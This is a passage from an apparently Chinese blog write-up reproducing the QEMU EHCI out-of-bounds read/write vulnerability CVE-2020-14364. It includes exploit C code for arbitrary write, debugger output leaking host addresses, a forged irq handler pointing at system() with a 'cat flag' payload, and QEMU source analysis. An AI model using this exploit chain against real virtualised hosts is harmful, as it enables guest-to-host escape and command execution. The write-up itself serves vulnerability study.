<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint64_t</span> setup_len,<span class="type">uint64_t</span> setup_index,<span class="type">int</span> perpare)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(perpare)&#123;</span><br><span class="line">        perpare_write();</span><br><span class="line">        set_length(<span class="number">0x1010</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] prepare write finished\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_bufoob + offset) = <span class="number">0x0000000200000002</span>; <span class="comment">// 覆盖成原先的内容</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0x8</span> +offset) = setup_len; <span class="comment">//setup_len</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0xc</span>+ offset) = setup_index;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同<code>oob_read</code>函数相同，在调用<code>read</code>之后的第一个<code>write</code>函数的时候需要将<code>perpare</code>位置为<code>1</code>表示需要设置一下<code>s-&gt;setup_state</code>以顺利的进入<code>do_token_out</code>的写操作部分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line"><span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">  len = p-&gt;iov.size;</span><br><span class="line">&#125;</span><br><span class="line">usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br></pre></td></tr></table></figure>

<p>我们看到这里还是将<code>setup_len</code>于<code>iov.size</code>对比了一下选择两者之间最小的进行覆写，这里在函数中是写死的。因此这里实际上写入的字节大小就是<code>len</code>的值也就是<code>0x1010</code>字节大小。溢出的<code>0x10</code>字节的写用来覆写<code>setup_len/setup_index</code>为指定的数值。</p>
<p>那么在任意写函数调用了第一次越界写入函数覆写完毕<code>setup_len/setup_index</code>之后<code>setup_index</code>要加上写入的字节数，此时的<code>setup_index=-8</code>。接着再一次调用了越界写函数，此时写入的目标地址就是<code>setup_buf</code>开始的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x s-&gt;setup_index</span><br><span class="line">$<span class="number">2</span> = <span class="number">0xfffffff8</span></span><br></pre></td></tr></table></figure>

<p>在这里将<code>setup_buf</code>覆写为了<code>read</code>函数调用所需要的数值，并将<code>setup_len</code>覆写为了<code>0xffff</code>，<code>setup_index</code>覆写为了<code>offset-0x1018</code>，那么此次的越界写写入的字节数为<code>0x1018</code>大小，覆写结束之后<code>setup_index</code>就变成了<code>offset</code>即<code>target_addr - data_buf_addr</code>，那么下一次的读函数的调用就是从<code>target_addr</code>开始读取数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x s-&gt;setup_index</span><br><span class="line">$<span class="number">4</span> = <span class="number">0xffffff9c</span></span><br><span class="line">pwndbg&gt; p/x s-&gt;setup_buf</span><br><span class="line">$<span class="number">5</span> = &#123;<span class="number">0x80</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x20</span>&#125;</span><br><span class="line">pwndbg&gt; p &amp;s-&gt;data_buf</span><br><span class="line">$<span class="number">6</span> = (<span class="type">uint8_t</span> (*)[<span class="number">4096</span>]) <span class="number">0x5555576b539c</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;port</span><br><span class="line">$<span class="number">7</span> = (USBPort **) <span class="number">0x5555576b5338</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x5555576b5338</span> - <span class="number">0x5555576b539c</span></span><br><span class="line">$<span class="number">8</span> = <span class="number">0xffffffffffffff9c</span></span><br></pre></td></tr></table></figure>

<p>那么接下来调用越界读函数就可以读取出<code>port</code>中存储的指针的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p s-&gt;port</span><br><span class="line">$<span class="number">10</span> = (USBPort *) <span class="number">0x55555762ea80</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x55555762ea80</span></span><br><span class="line"><span class="number">0x55555762ea80</span>: <span class="number">0x00005555576b52c0</span>      <span class="number">0x0000000000000004</span></span><br></pre></td></tr></table></figure>

<p>从该值我们可以推测出<code>EHCIState</code>结构体的地址，因为此值就是<code>EHCIState</code>中的<code>ports</code>的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;((<span class="keyword">struct</span> EHCIState*)<span class="number">0</span>)-&gt;ports</span><br><span class="line">$<span class="number">26</span> = (USBPort (*)[<span class="number">6</span>]) <span class="number">0x540</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x55555762ea80</span><span class="number">-0x540</span></span><br><span class="line">$<span class="number">27</span> = <span class="number">0x55555762e540</span></span><br><span class="line">pwndbg&gt; p &amp;((<span class="keyword">struct</span> EHCIState *)<span class="number">0x55555762e540</span>).ports</span><br><span class="line">$<span class="number">28</span> = (USBPort (*)[<span class="number">6</span>]) <span class="number">0x55555762ea80</span></span><br><span class="line">pwndbg&gt; p s-&gt;port</span><br><span class="line">$<span class="number">29</span> = (USBPort *) <span class="number">0x55555762ea80</span></span><br></pre></td></tr></table></figure>

<p>那么得到该结构体的地址之后我们就可以得到<code>irq</code>成员变量的地址。之后读取了<code>irq</code>成员变量里面存储的值，但是我现在还不知道该值有什么作用。</p>
<p>还差一点就是为什么这两个<code>ports</code>的值相同。这里我们需要深入的分析一下<code>usb_claim_prot</code>这个函数，这个之后再进行分析。</p>
<h3 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h3><p>目前我们已经知道了<code>EHCIState</code>结构体的地址，那么接下来就是要伪造一个<code>qemu_irq</code>结构体将<code>handler</code>设置为<code>system.plt</code>的地址将<code>opaque</code>设置为<code>payload</code>的地址，覆写<code>EHCIState-&gt;irq</code>指针为我们伪造的结构体的地址，那么之后发生的<code>irq-&gt;handler(irq-&gt;opaque)</code>的调用就可以执行我们的<code>payload</code>了。看一下这里的<code>exp</code>代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x28</span>) = system_addr;<span class="comment">// handler指针</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x30</span>) = device_addr+<span class="number">0xdc</span>+<span class="number">0x100</span>;<span class="comment">// opaque指针指向data_buf+0x100的位置</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x38</span>) = <span class="number">0x3</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(data_buf + <span class="number">0x100</span>) = <span class="number">0x67616c6620746163</span>; <span class="comment">//payload</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 3/3\033[0m\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">anywhere_write(irq_addr, fake_irq_addr,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>这里首先是覆写了<code>setup_len,setup_index</code>，这一步好像是没什么用，接着就直接覆写了<code>EHCIState-&gt;irq</code>这个指针为我们伪造的<code>qemu_irq</code>结构体的地址。这里我们看一下任意地址写函数<code>anywhere_write</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">anywhere_write</span><span class="params">(<span class="type">uint64_t</span> target_addr,<span class="type">uint64_t</span> payload,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Write\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, offset+<span class="number">0x8</span>, offset<span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Hacked!\033[0m\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = payload;</span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先函数利用越界写设置<code>setup_len,setup_index</code>。但是由于越界写入指定了写入的字节的大小就是<code>0x1010</code>，因此这里在第一次越界写入之后就<code>setup_index</code>就会变成<code>offset</code>，下一次的越界写入就从<code>target_addr</code>开始写入<code>0x1010</code>大小的字节了，并且这里写入的源地址是<code>data_buf</code>指针指向的内容。因此这里就实现了任意写。</p>
<p>并且最后一个任意写在这里还存在一个功能就是触发<code>qemu_set_irq</code>函数，由于此时任意写的<code>addr=0</code>，那么在<code>echi_opreg_write</code>函数中走入的分支就是<code>USBCMD</code>也就是覆写<code>usbcmd</code>成员变量，但是这里会调用一个<code>echi_reset</code>函数，那么就会发生如下的函数调用链<code>ehci_reset-&gt;usb_detach-&gt;ehci_detach-&gt;ehci_raise_irq-&gt;ehci_update_irq-&gt;qemu_set_irq</code></p>
<p>最终就会调用<code>irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</code>也就是会执行我们的<code>payload</code>。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210320154514980.png" alt="图片无法显示，请联系作者" title=" ">

<p>那么由于这里我是在<code>docker</code>中进行调试的，因此这里我将弹出计算器的操作改成了读取<code>flag</code>。</p>
<h2 id="iov-size"><a href="#iov-size" class="headerlink" title="iov.size"></a>iov.size</h2><p>对于<code>iov</code>的赋值是从<code>qemu_iovec_add</code>函数开始的，发生如下的函数调用链<code>echi_execute-&gt;usb_packet_map-&gt;qemu_iovec_add</code>，我们看一下该函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QEMUIOVector</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span>;</span></span><br><span class="line">    <span class="type">int</span> niov;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">int</span> nalloc;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">local_iov</span>;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">char</span> __pad[<span class="keyword">sizeof</span>(<span class="type">int</span>) + offsetof(<span class="keyword">struct</span> iovec, iov_len)];</span><br><span class="line">            <span class="type">size_t</span> size;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; QEMUIOVector;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *iov_base;</span><br><span class="line">    <span class="type">size_t</span> iov_len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">qemu_iovec_add</span><span class="params">(QEMUIOVector *qiov, <span class="type">void</span> *base, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(qiov-&gt;nalloc != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (qiov-&gt;niov == qiov-&gt;nalloc) &#123;</span><br><span class="line">        qiov-&gt;nalloc = <span class="number">2</span> * qiov-&gt;nalloc + <span class="number">1</span>;</span><br><span class="line">        qiov-&gt;iov = g_renew(<span class="keyword">struct</span> iovec, qiov-&gt;iov, qiov-&gt;nalloc);</span><br><span class="line">    &#125;</span><br><span class="line">    qiov-&gt;iov[qiov-&gt;niov].iov_base = base;</span><br><span class="line">    qiov-&gt;iov[qiov-&gt;niov].iov_len = len;</span><br><span class="line">    qiov-&gt;size += len;</span><br><span class="line">    ++qiov-&gt;niov;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入的<code>base</code>是一个物理地址，<code>len</code>是长度。可以看到这里对<code>iov</code>的所有变量进行了赋值。<code>qiov</code>是一个<code>QEMUIOVector</code>结构体，该结构体中的第一个成员变量<code>iov</code>是一个<code>iovc</code>结构体指针数组。<code>niov</code>表示的是数组下标即<code>index</code>。我们看一下<code>qemu_iovec_add</code>函数的上层函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ScatterGatherEntry</span> &#123;</span></span><br><span class="line">    <span class="type">dma_addr_t</span> base;</span><br><span class="line">    <span class="type">dma_addr_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUSGList</span> &#123;</span></span><br><span class="line">    ScatterGatherEntry *sg;</span><br><span class="line">    <span class="type">int</span> nsg;</span><br><span class="line">    <span class="type">int</span> nalloc;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    DeviceState *dev;</span><br><span class="line">    AddressSpace *as;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">usb_packet_map</span><span class="params">(USBPacket *p, QEMUSGList *sgl)</span></span><br><span class="line">&#123;</span><br><span class="line">    DMADirection dir = (p-&gt;pid == USB_TOKEN_IN) ?</span><br><span class="line">        DMA_DIRECTION_FROM_DEVICE : DMA_DIRECTION_TO_DEVICE;</span><br><span class="line">    <span class="type">void</span> *mem;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sgl-&gt;nsg; i++) &#123;</span><br><span class="line">        <span class="type">dma_addr_t</span> base = sgl-&gt;sg[i].base;</span><br><span class="line">        <span class="type">dma_addr_t</span> len = sgl-&gt;sg[i].len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (len) &#123;</span><br><span class="line">            <span class="type">dma_addr_t</span> xlen = len;</span><br><span class="line">            mem = dma_memory_map(sgl-&gt;as, base, &amp;xlen, dir);</span><br><span class="line">            <span class="keyword">if</span> (!mem) &#123;</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (xlen &gt; len) &#123;</span><br><span class="line">                xlen = len;</span><br><span class="line">            &#125;</span><br><span class="line">            qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);</span><br><span class="line">            len -= xlen;</span><br><span class="line">            base += xlen;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">    usb_packet_unmap(p, sgl);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们看到函数传入参数<code>mem,xlen</code>是由<code>sgl</code>这个数据结构体得来的。根据<code>nsg</code>的值依次添加相应的<code>iov</code>。我们看一下<code>sgl</code>的赋值过程。该结构体其实是从<code>ehci_init_transfer</code>函数中生成的，发生了如下的函数调用链<code>ehci_execute-&gt;ehci_init_transfer-&gt;qemu_sglist_add</code>，我们先来看一下<code>qemu_sglist_add</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">qemu_sglist_add</span><span class="params">(QEMUSGList *qsg, <span class="type">dma_addr_t</span> base, <span class="type">dma_addr_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (qsg-&gt;nsg == qsg-&gt;nalloc) &#123;</span><br><span class="line">        qsg-&gt;nalloc = <span class="number">2</span> * qsg-&gt;nalloc + <span class="number">1</span>;</span><br><span class="line">        qsg-&gt;sg = g_realloc(qsg-&gt;sg, qsg-&gt;nalloc * <span class="keyword">sizeof</span>(ScatterGatherEntry));</span><br><span class="line">    &#125;</span><br><span class="line">    qsg-&gt;sg[qsg-&gt;nsg].base = base;</span><br><span class="line">    qsg-&gt;sg[qsg-&gt;nsg].len = len;</span><br><span class="line">    qsg-&gt;size += len;</span><br><span class="line">    ++qsg-&gt;nsg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数的逻辑和<code>qemu_iovec_add</code>函数的逻辑类似，我们看一下上层函数<code>base,len</code>的赋值过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_init_transfer</span><span class="params">(EHCIPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> cpage, offset, bytes, plen;</span><br><span class="line">    <span class="type">dma_addr_t</span> page;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> QTD_TOKEN_CPAGE_MASK          0x00007000</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> QTD_TOKEN_CPAGE_SH            12</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> QTD_TOKEN_TBYTES_MASK         0x7fff0000</span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> QTD_TOKEN_TBYTES_SH           16</span></span><br><span class="line">    cpage  = get_field(p-&gt;qtd.token, QTD_TOKEN_CPAGE);</span><br><span class="line">    bytes  = get_field(p-&gt;qtd.token, QTD_TOKEN_TBYTES);</span><br><span class="line">    offset = p-&gt;qtd.bufptr[<span class="number">0</span>] &amp; ~QTD_BUFPTR_MASK;</span><br><span class="line">    qemu_sglist_init(&amp;p-&gt;sgl, p-&gt;<span class="built_in">queue</span>-&gt;ehci-&gt;device, <span class="number">5</span>, p-&gt;<span class="built_in">queue</span>-&gt;ehci-&gt;as);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (bytes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cpage &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;cpage out of range (%d)\n&quot;</span>, cpage);</span><br><span class="line">            qemu_sglist_destroy(&amp;p-&gt;sgl);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        page  = p-&gt;qtd.bufptr[cpage] &amp; QTD_BUFPTR_MASK;</span><br><span class="line">        page += offset;</span><br><span class="line">        plen  = bytes;</span><br><span class="line">        <span class="keyword">if</span> (plen &gt; <span class="number">4096</span> - offset) &#123;</span><br><span class="line">            plen = <span class="number">4096</span> - offset;</span><br><span class="line">            offset = <span class="number">0</span>;</span><br><span class="line">            cpage++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        qemu_sglist_add(&amp;p-&gt;sgl, page, plen);</span><br><span class="line">        bytes -= plen;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到<code>cpage</code>是一个类似于<code>index</code>的东西，<code>base</code>也就是基地址对应的<code>page</code>来自于<code>bufptr[cpage]</code>。<code>len</code>也就是<code>size</code>对应的<code>plen</code>来自于<code>bytes</code>，而<code>bytes</code>和<code>cpage</code>都是从<code>token</code>中提取出来的。而我们又可以通过<code>periodiclistbase</code>控制<code>list</code>和<code>entry</code>从而控制<code>qtd</code>结构体，也即是我们可以控制<code>bufptr</code>和<code>token</code>这两个成员变量。也就是我们可以控制<code>iov</code>结构体的所有内容。</p>
<p>其实我们看到进行读写即<code>do_token_in/out</code>的关键函数<code>use_packet_copy</code>函数就是对向<code>iov.iov</code>写入数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usb_packet_copy</span><span class="params">(USBPacket *p, <span class="type">void</span> *ptr, <span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;actual_length &gt;= <span class="number">0</span>);</span><br><span class="line">    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);</span><br><span class="line">    <span class="keyword">switch</span> (p-&gt;pid) &#123;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">        iov_from_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: invalid pid: %x\n&quot;</span>, __func__, p-&gt;pid);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;actual_length += bytes;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">iov_to_buf</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> iov_cnt,</span></span><br><span class="line"><span class="params">           <span class="type">size_t</span> offset, <span class="type">void</span> *buf, <span class="type">size_t</span> bytes)</span></span><br><span 